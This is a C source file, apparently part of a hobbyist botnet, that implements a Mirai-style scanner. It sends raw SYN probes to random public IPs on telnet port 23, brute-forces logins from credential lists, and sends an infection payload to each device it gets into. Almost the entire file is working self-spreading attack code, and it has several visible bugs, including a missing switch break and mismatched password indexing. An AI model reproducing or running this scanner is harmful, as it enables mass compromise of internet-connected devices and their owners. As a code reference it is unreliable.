#include "../include/main.h"
/*
	Okay so the original idea was to have a listening proc a sending proc and
	a recv proc. Then when it recv a client it would spawn a proc to deal with
	that client.

	Then I realized how weak the devices I'm aiming for are and just used a
	structure similar to mirai. Edit: so after writing most of this scanner I read mirais
	and it looks like we had the same idea... I've also decided to steal some of it's functions because it's easier

	Full disclosure: I'm not a coding and network god so mirais scanner is
	probably better (100% sure it is). I'm just doing this for fun :)
*/
port_t LOCAL_PORT; // Global source port
ipv4_t LOCAL_ADDR; // Global source port
struct scan_victim *victim_table;

bool scan_able = true;
bool scan_scanning = false;

void scan_init(void)
{
#	ifndef SCANNER_TEST
	int32_t ret;

	if ((ret = fork()) != 0)
		return; // We are parent or it failed, lets go home
	else // Child has spawned and we are the child
	{
		// if (proc_root()) // Make it check for root and stuff later
		if (scan_scanner() == false)
			scan_able = false;
		_exit(0);
	}
#	endif
	return;
}

// Checksum calculators
// Only for use in this file
// Not mine!
uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}
uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

#define TELNET_DO 0xFD
#define TELNET_WONT 0xFC
#define TELNET_WILL 0xFB
#define TELNET_DONT 0xFE
#define TELNET_CMD 0xFF
#define TELNET_CMD_ECHO 1
 
static inline __attribute__((always_inline)) bool scan_negotiate(int32_t sock, unsigned char *buf, int16_t len)
{
	printd("Negotiating sock %d with str %x %x", sock, buf[0], buf[1]);
	if (buf[0] == TELNET_DO)
	{
		unsigned char tmp1[3] = {255, 251, 31};
		unsigned char tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

		if (send(sock, tmp1, 3, 0) < 0)
			return false;
		if (send(sock, tmp2, 9, 0) < 0)
			return false;

		return true;
	}

	for (uint8_t i = 0; i < len; i++)
	{
		if (buf[i] == TELNET_DO)
			buf[i] = TELNET_WONT;
		else if (buf[i] == TELNET_WILL)
			buf[i] = TELNET_DO;
	}
	if (send(sock, buf, len, 0) < 0)
		return false;

	return true;
}

static inline __attribute__((always_inline)) void xselect(int32_t fd)
{
	fd_set fdset;
	struct timeval timeout;
	timeout.tv_sec = SCAN_SCANNER_STIMEOUT_SEC;
	timeout.tv_usec = SCAN_SCANNER_STIMEOUT_USEC;

	FD_ZERO(&fdset);
	FD_SET(fd, &fdset);
	select(fd + 1, &fdset, NULL, NULL, &timeout);
}

uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2)
{
	/*
	// This code right here works
	// WHAT THE _____
	// Fill in whatever you find apropriate on that line
	// So essentially this code actually works with nonblocking and everything
	// I think it actually works because it waits on the select to make sure that theres data to read
	// then it reads it
	// I'm trying so hard not swear rn

	struct timeval asdasdasd;
	asdasdasd.tv_sec = SCAN_SCANNER_STIMEOUT_SEC;
	asdasdasd.tv_usec = SCAN_SCANNER_STIMEOUT_USEC;
	fd_set xas;
	FD_ZERO(&xas);
	FD_SET(sock, &xas);
	int xret;
	xret = select(sock + 1, &xas, NULL, NULL, &asdasdasd);
	printd("Select ret %d", xret)

	unsigned char bigbuf[1000];
	int ret;
	if ((ret = recv(sock, bigbuf, sizeof(bigbuf), MSG_NOSIGNAL)) < 0) // Read 1 from socket
	{
		printd("Error %d: %s", errno, strerror(errno));
		return 0;
	}
	else
	{
		printd("Read %d bytes: %s", ret, bigbuf)
	}
	return 1;
	*/

	/*
	Alright so it turns out this code worked the whole time and the 10h I spend debugging it were useless
	Essetnailly because it was in a while (1) loop it would recv() properly until there was no data to read
	Since I had no message that showed success it just kept going until it failed
	I guess the strcmp() like func wasn't working so anyway I mreally messed up
	*/

	int16_t i = 0, maxlen = -1, minlen = 1024;
	unsigned char *buf = malloc(sizeof(unsigned char *));

	while (*strs != NULL)
	{
		// printf("%s\n", *strs);
		int16_t _len = strlen(*strs++);
		if (_len > maxlen)
			maxlen = _len;
		if (_len < minlen)
			minlen = _len;
	}
	while (*strs2 != NULL)
	{
		// printf("%s\n", *strs2);
		int16_t _len = strlen(*strs2++);
		if (_len > maxlen)
			maxlen = _len;
		if (_len < minlen)
			minlen = _len;
	}

	unsigned char mbuf[1024];
	while (1)
	{
		xselect(sock);
		if (recv(sock, buf, 1, MSG_NOSIGNAL) < 0) // Read 1 from socket
		{
			printd("Error %d: %s", errno, strerror(errno));
			return 0;
		}
		#warning Instead of checking for 0xFF every read why not make that a stage in the switch() on the scanner
		if (*buf == TELNET_CMD)
		{
			uint8_t longbuf[2];
			if (recv(sock, longbuf, 2, MSG_NOSIGNAL) <= 0)
			{
				printd("Error %d: %s", errno, strerror(errno));
				return 0;
			}
			if (scan_negotiate(sock, longbuf, 2) == false)
			{
				printd("Failed to negotiate");
			}
		}
		else
		{
			mbuf[i++] = *buf;
			// printf("mbuf = \"%s\"\n", mbuf);
			// printf("%x\n", mbuf[strlen((const char *)mbuf) - 1]);
		}
		if (i >= minlen)
		{
			#warning This needs to be fixed. Because of the min max stuff it's already gone thru all and is null. I needa change that
			while (*strs != NULL)
			{
				printf("Comparing %s to %s\n", mbuf, *strs);
				if (subcasestr((const char *)mbuf, *strs++) != -1)
					return 1;
			}
			while (*strs2 != NULL)
			{
				printf("Comparing %s to %s\n", mbuf, *strs2);
				if (subcasestr((const char *)mbuf, *strs2++) != -1)
					return 2;
			}
		}
	}
	return 0;
}

bool scan_setnonblock(int32_t fd)
{
	if (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)) == -1)
	{
		printd("Failed to set nonblocking error %d: %s", errno, strerror(errno));
		return false;
	}
	return true;
}

bool scan_scanner(void)
{
	int32_t max = getdtablesize();
	printd("Maximum files open: %d", max)
#	ifndef SCANNER_TEST
	if (scan_able == false || scan_scanning == true)
		_exit(0);
#	endif
	scan_scanning = true;
	printd("Initializing Scanner")

	victim_table = calloc(SCAN_SCANNER_MAXCON, sizeof(struct scan_victim));
	for (uint8_t i = 0; i <= SCAN_SCANNER_MAXCON; i++)
	{
		victim_table[i].sock = -1;
		victim_table[i].state = END;
		victim_table[i].user = 0;
		victim_table[i].pass = 0;
		victim_table[i].tries = 0;
	}

	uint8_t _numconns, _finished;
	int32_t sock, i = 1, n;
	char datagram[200];
	zero(datagram, 200);

	// IP and TCP  structures
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

	/* sockaddr struct and checksum struct */
	struct sockaddr_in addr;

#	ifdef SCANNER_TEST
	LOCAL_ADDR = ipv4_pack(127, 0, 0, 1);
#	else
	if (ipv4_getinfo(&LOCAL_ADDR) == false)
		goto end;
#	endif
	printd("Local info: %d %s", LOCAL_ADDR, ipv4_unpack(LOCAL_ADDR));

	// Set the random source port
	do
		LOCAL_PORT = rand();
	while (LOCAL_PORT < 1024); // make sure it isn't send below 1024 which is
	// reserved for root use only


	// Sockaddr header fillout
	addr.sin_family = AF_INET;
	addr.sin_port = htons(23);

	// IP header fillout
	iph->saddr = LOCAL_ADDR;
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0; // TOS = Type of service Can change QoS
	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
	iph->ttl = 64; // TTL = TTL goes down onces for ever re-router it hits. If it hits 0 its discarded and icmp error sent
	iph->protocol = 6; // 6 = TCP

	// TCP header fillout
	tcph->source = htons(LOCAL_PORT);
	tcph->dest = htons(23); // Port 23 dest
	tcph->ack_seq = 0;
	tcph->doff = 5; // Size of tcp header
	tcph->fin = 0;
	tcph->syn = 1; // Syncronize packet to check if the port is open
	tcph->rst = 0; // No other should be checked
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = rand() & 0xffff; // Maximum allowed window size
	tcph->urg_ptr = 0;

	// Create a raw socket
	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
	{
		printd("Failed to open raw socket");
		goto end;
	}


	if ((fcntl(sock, F_SETFL, O_NONBLOCK | fcntl(sock, F_GETFL, 0))) == -1)
	{
		printd("fcntl() failed to set O_NONBLOCK. Errno: %d | %s", errno, strerror(errno));
		goto end;
	}

	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) < 0)
	{
		printd("Failed to set IP_HDRINCL");
		goto end;
	}

	while (1)
	{
#		ifndef SCANNER_TEST
		for (i = 0; i < SCAN_SCANNER_BURST; i++)
#		endif
		{
#			ifdef SCANNER_TEST
			iph->daddr = ipv4_pack(127, 0, 0, 1);
#			else
			iph->daddr = ipv4_random_public();
#			endif
			iph->id = (rand() % 65535); // This line might be wrong
			iph->check = 0;
			iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

			tcph->seq = iph->daddr;
			tcph->check = 0;
			tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

			// Fill out addr
			addr.sin_addr.s_addr = iph->daddr;

			// Send the packet
			sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr));
#			ifdef SCANNER_TEST
			sleep(1); // Don't spam packets if we're testing
#			endif
		}
		i = 0;
		while (1)
		{
			char buf[1514];
			struct iphdr *riph = (struct iphdr *)buf;
			/*
			Alright so this is the offending line that gave me hours of debugging
			It used to be struct tcphdr *rtcph = (struct tcphdr *)(iph + 1);
			Notice how it says iph + 1
			iph
			not riph
			iph
			So essentially I was reading the tcp buffer off of the last sent packet
			Jesus
			*/
			struct tcphdr *rtcph = (struct tcphdr *)(riph + 1);

			n = recvfrom(sock, buf, sizeof(buf), MSG_NOSIGNAL, NULL, NULL);
			if (n <= 0 /*|| errno == EAGAIN || errno == EWOULDBLOCK || errno != 0*/)
				break;

			// printd("%s->%s/%s\t Proto: %d Flags: SYN %d ACK %d RST %d", ipv4_unpack(riph->saddr), ipv4_unpack(riph->daddr), ipv4_unpack(LOCAL_ADDR), riph->protocol, rtcph->syn, rtcph->ack, rtcph->rst);
			if (n < (int32_t)(sizeof(struct iphdr) + sizeof(struct tcphdr)))
				continue;
			if (riph->protocol != 6) // Packet needs to be TCP
				continue;
			if (rtcph->syn != 1)
				continue;
			if (rtcph->ack != 1)
				continue;
			if (rtcph->source != htons(23))
				continue;
			// This line was also iph->daddr instead of riph->daddr which was even more debugging
			if (riph->daddr != LOCAL_ADDR)
				continue;

			// Send back a ack rst to close any running threads on the telnet server
			/*
			iph->saddr = LOCAL_ADDR;
			iph->daddr = riph->saddr;
			iph->ihl = 5;
			iph->version = 4;
			iph->tos = 0; // TOS = Type of service Can change QoS
			iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
			iph->ttl = 64; // TTL = TTL goes down onces for ever re-router it hits. If it hits 0 its discarded and icmp error sent
			iph->protocol = 6; // 6 = TCP
			iph->id = (rand() % 65535); // This line might be wrong
			iph->check = 0;
			iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

			tcph->source = htons(LOCAL_PORT);
			tcph->dest = htons(23); // Port 23 dest
			tcph->ack_seq = 0;
			tcph->doff = 5; // Size of tcp header
			tcph->fin = 0;
			tcph->syn = 0;
			tcph->rst = 1;
			tcph->psh = 0;
			tcph->ack = 1;
			tcph->urg = 0;
			tcph->window = rand() & 0xffff; // Maximum allowed window size
			tcph->urg_ptr = 0;
			tcph->seq = (rand() % 65535);
			tcph->check = 0;
			tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

			addr.sin_addr.s_addr = iph->daddr;

			sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr)); */

			printd("Attempting to brute: %s", ipv4_unpack(riph->saddr));
			struct scan_victim *victim;
			victim = &victim_table[i];
			victim->ip = riph->saddr;
			victim->user = 0;
			victim->pass = 0;
			victim->tries = 0;
			victim->state = CONNECTING;
			if (i++ >= SCAN_SCANNER_MAXCON)
			{
				i--;
				break;
			}
		}
		// printd("Moving to bruteforce");
		_numconns = i;
		_finished = 0;
		while (1)
		{
			if (i == 0) // if i was no incremented (no devices were found) we will move on
				break;
			
			struct sockaddr_in addrx;
			addrx.sin_family = AF_INET;
			addrx.sin_port = htons(23);
			memset(addrx.sin_zero, '\0', sizeof(addrx.sin_zero));

			fd_set fdset;
			struct timeval timeout;
			timeout.tv_sec = SCAN_SCANNER_TIMEOUT_SEC;
			timeout.tv_usec = SCAN_SCANNER_TIMEOUT_USEC;
			struct timeval stimeout;
			stimeout.tv_sec = SCAN_SCANNER_STIMEOUT_SEC;
			stimeout.tv_usec = SCAN_SCANNER_STIMEOUT_USEC;

			for (i = 0; i <= SCAN_SCANNER_MAXCON; i++)
			{
				switch(victim_table[i].state)
				{
					case CONNECTING:
					{
						addrx.sin_addr.s_addr = victim_table[i].ip;
						if ((victim_table[i].sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
						{
							victim_table[i].state = FINISHED;
							break;
						}

						// setsockopt(victim_table[i].sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
						// setsockopt(victim_table[i].sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));

						if (scan_setnonblock(victim_table[i].sock) == false)
							victim_table[i].state = FINISHED;

						if (connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS)
						{
							printd("%d->%s Failed to connect error %d: %s", i, ipv4_unpack(victim_table[i].ip), errno, strerror(errno));
							victim_table[i].state = FINISHED;
						}
						else
						{
							victim_table[i].state = SELECT;
							printd("%d->%s Connected", i, ipv4_unpack(victim_table[i].ip));
						}
						break;
					}
					case SELECT:
					{
						FD_ZERO(&fdset);
						FD_SET(victim_table[i].sock, &fdset);
						if (select(victim_table[i].sock + 1, NULL, &fdset, NULL, &stimeout) <= 0)
						{
							printd("%d->%s Failed to select error %d: %s", i, ipv4_unpack(victim_table[i].ip), errno, strerror(errno));
							victim_table[i].state = FINISHED;
						}
						else
						{
							printd("%d->%s Select success", i, ipv4_unpack(victim_table[i].ip));
							// From Qbot scanner
							// I think it checks for erros and if thers one valopt becomes 1
							socklen_t tmp = sizeof(int);
							int32_t retval = 0;
							getsockopt(victim_table[i].sock, SOL_SOCKET, SO_ERROR, (void*)(&retval), &tmp);
							if (retval)
							{
								victim_table[i].state = FINISHED;
							}
							else
							{
								// Does this line remove nonblock? If so I gotta remov this
								// fcntl(victim_table[i].sock, F_SETFL, fcntl(victim_table[i].sock, F_GETFL, NULL) & (~O_NONBLOCK));
								victim_table[i].state = USERNAME;
							}
						}
						break;
					}
					case USERNAME:
					{
						uint8_t x = scan_readuntil(victim_table[i].sock, userprompts, prompts);

						switch (x)
						{
							case 0:
								printd("%d->%s Failed to read", i, ipv4_unpack(victim_table[i].ip));
								victim_table[i].state = FINISHED;
								goto _USERNAME_END;
							case 1:
								printd("%d->%s Found userprompt", i, ipv4_unpack(victim_table[i].ip));
								break;
							case 2:
								printd("%d->%s Got payload prompt", i, ipv4_unpack(victim_table[i].ip));
								victim_table[i].state = PAYLOAD;
								goto _USERNAME_END;
						}
						printd("%d->%s Trying username %s", i, ipv4_unpack(victim_table[i].ip), usernames[victim_table[i].user]);
						if (send(victim_table[i].sock, usernames[victim_table[i].user], strlen(usernames[victim_table[i].user]), 0) == -1)
						{
							printd("%d->%s Failed to send username", i, ipv4_unpack(victim_table[i].ip));
							victim_table[i].state = FINISHED;
							break;
						}
						x = scan_readuntil(victim_table[i].sock, failstrs, passprompts);
						switch (x)
						{
							case 0:
								printd("%d->%s Failed to read", i, ipv4_unpack(victim_table[i].ip));
								victim_table[i].state = FINISHED;
								break;
							case 1:
								printd("%d->%s Username failed", i, ipv4_unpack(victim_table[i].ip));
								if (victim_table[i].user++ >= usersize)
									victim_table[i].state = FINISHED;
								break;
							case 2:
								printd("%d->%s Username success", i, ipv4_unpack(victim_table[i].ip));
								victim_table[i].state = PASSWORD;
								break;
						}
_USERNAME_END:
						break;
					}
					case PASSWORD:
					{
						printd("%d->%s Trying password %s", i, ipv4_unpack(victim_table[i].ip), passwords[victim_table[i].user]);
						if (send(victim_table[i].sock, passwords[victim_table[i].pass], strlen(passwords[victim_table[i].pass]), 0) == -1)
						{
							printd("%d->%s Failed to send password", i, ipv4_unpack(victim_table[i].ip));
							victim_table[i].state = FINISHED;
							break;
						}

						uint8_t x = scan_readuntil(victim_table[i].sock, failstrs, prompts);
						switch (x)
						{
							case 0:
								printd("%d->%s Failed to read", i, ipv4_unpack(victim_table[i].ip));
								victim_table[i].state = FINISHED;
								break;
							case 1:
								printd("%d->%s Password failed", i, ipv4_unpack(victim_table[i].ip));
								if (victim_table[i].pass++ >= passsize)
								{
									victim_table[i].pass = 0;
									if (victim_table[i].user++ >= usersize)
										victim_table[i].state = FINISHED;
									else
										victim_table[i].state = USERNAME;
								}
							case 2:
								printd("%d->%s Password success", i, ipv4_unpack(victim_table[i].ip));
								victim_table[i].state = PAYLOAD;
						}
						break;
					}
					case PAYLOAD:
					{
						// I know this look stupid for now but I'll clean it up later
						printd("%d->%s Sending payload", i, ipv4_unpack(victim_table[i].ip));
						if (send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, strlen(SCAN_SCANNER_PAYLOAD), 0) == -1)
							victim_table[i].state = FINISHED;
						victim_table[i].state = FINISHED;
						break;
					}
					case FINISHED:
					{
						printd("%d->%s Finished", i, ipv4_unpack(victim_table[i].ip));
						_finished++;
						close(victim_table[i].sock);
						victim_table[i].state = END;
						break;
					}
					case END:
					{
						if (_finished >= _numconns)
						{
							goto _breakloop;
						}
						break;
					}
				}
			}
		}
_breakloop:;
	}
end:
	scan_scanning = false;
	free(victim_table);
	_exit(0);
}
